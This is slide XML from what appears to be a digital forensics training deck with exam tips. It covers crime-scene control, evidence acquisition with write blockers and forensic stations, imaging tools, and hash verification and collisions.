              <a:rPr sz="2000" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Documentation</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  IR plan &amp; log</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Chain of custody forms</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Contact list</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690</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Control the Crime Scene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Controlling the crime scene means restricting and recording access to the affected systems and area so evidence is not altered, lost, or contaminated before and during collection.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This is enforced by creating an access list that logs who entered, where, and when, limiting entry to trained and certified personnel, documenting all visitors, and controlling any interaction with the systems themselves.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Preventing contamination is central, which is why chain-of-custody is maintained for every item and why volatile-evidence guidance often says to leave the power on so that memory, running processes, and network connections are not destroyed before capture.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts care because an uncontrolled scene introduces doubt about integrity, and a single unlogged person or a hasty shutdown can wipe volatile evidence and undermine the whole investigation.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions test access control, chain-of-custody, and the volatile-data rule that improperly powering off a system destroys memory-resident evidence.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691</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Control the Crime Scene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Control access</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Create access list</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Who, where, when</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Trained &amp; certified personnel</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Document</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Visitors</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Access to systems</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Contamination</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Maintain chain-of-custody</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692</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Control the Crime Scene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Leave the power on</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Unless malware is destroying evidence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Running memory can give clues</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Advanced malware might not write to disk</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693</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Acquisition Process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The acquisition process is the controlled copying of data from a source system onto forensically clean destination media, producing the working image the investigation is built on.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It begins by preparing the destination media, verifying it is wiped clean so no residual data contaminates the evidence, and choosing secure storage such as a removable hard drive or a network-based collection option.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The copy is made on a forensic station using a hardware or software write blocker, which permits reading from the source while blocking any writes so the original is never modified during acquisition, and the resulting image is hash-verified to prove it matches the source.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts rely on this process because a properly acquired, write-blocked, hash-verified image is what makes downstream analysis trustworthy and the evidence defensible.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect the write blocker and clean, verified destination media to be the correct answers for preventing source alteration and evidence contamination during acquisition.</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694</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Acquisition Process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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Prepare destination media</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Securely store data</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Removable hard drive or network-based option</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Make sure destination media is clean</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_c9d66737d4.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2200275"/>
            <a:ext cx="4937760" cy="346329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695</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Acquisition Process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Prepare destination media</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Prevent changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Forensic station</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Special set-ups</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Securely copy from source to destination</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Write blocker</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Prevents changes when copying</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Mouse jigglers</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  Prevents computer from falling asleep</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696</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Forensics Station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A forensics station is a dedicated, controlled workstation or field kit purpose-built for acquiring and analyzing digital evidence without contaminating it, exemplified by field units such as the CRU Ditto forensic field kit.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It integrates the tools an examiner needs in one place, commonly built-in or attached write blockers, multiple source and destination interfaces, imaging and hashing utilities, and secure storage, so acquisitions are performed consistently and defensibly.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Using an isolated, trusted station keeps evidence handling separate from everyday IT systems, reducing the chance that malware or accidental writes compromise the case.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts value a standardized forensics station because it enforces good practice by design and speeds repeatable, court-ready acquisitions in both lab and field settings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Recognize the forensics station or field kit as the dedicated, write-blocked platform used to image and analyze evidence rather than using a general-purpose production machine.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697</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Forensics Station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g_9d80e6f052.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2649702" y="1783080"/>
            <a:ext cx="6889548" cy="4434840"/>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698</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide6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3 · SEIZURE &amp; ACQUISITIONS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Write Blocker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A write blocker is a hardware or software device placed between a source drive and the forensic station that allows read commands to pass through while intercepting and blocking any write commands to the original media.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  By preventing any modification of the source, it guarantees that acquisition does not change even a single bit, which is what lets the examiner produce a hash of the image that matches the original and prove integrity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hardware write blockers such as the CRU Ditto are generally preferred for forensic soundness because they enforce the protection at the interface level rather than relying on operating-system settings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  SOC analysts treat the write blocker as non-negotiable during acquisition, since mounting a suspect drive without one can alter timestamps and metadata and destroy the evidentiary value of the data.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The write blocker is the standard exam answer for preserving the integrity of original media during imaging, often contrasted with the mistake of connecting a drive directly.</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699</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · SEIZURE &amp; ACQUISITIONS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Write Blocker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g_fff1869550.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2287905" y="1783080"/>
            <a:ext cx="7613142" cy="4434840"/>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700</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Acquisition Process (3)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Prepare destination media</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Prevent changes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Hash the source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Fixed snapshot of evidence</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Image the source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Commercial</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  FTK Imager</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Open source</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>·  dd</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Verify the acquisition</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  MD5 or SHA hash</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701</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Acquisition Process (3) (cont'd)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Protect the acquisition</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702</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Hash Demo</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g_e8186f7ac6.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="2363683" y="1783080"/>
            <a:ext cx="7461585" cy="4434840"/>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703</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
</p:sld>
</file>

<file path=ppt/slides/slide7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3 · FORENSICS ACQUISITION TOOLS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Hash Collisions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A hash function maps data of any size to a fixed-length digest, and a hash collision occurs when two different inputs produce the same digest, which matters because forensics and integrity checks rely on a matching hash to prove two items are identical.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Older algorithms such as MD5 and SHA-1 are now considered cryptographically broken because researchers can deliberately engineer collisions, so an attacker could in principle craft a malicious file that shares a hash with a benign one.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For this reason current practice uses stronger algorithms such as SHA-256, and examiners often record multiple hashes so that an accidental or engineered collision in one algorithm does not undermine evidence integrity.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
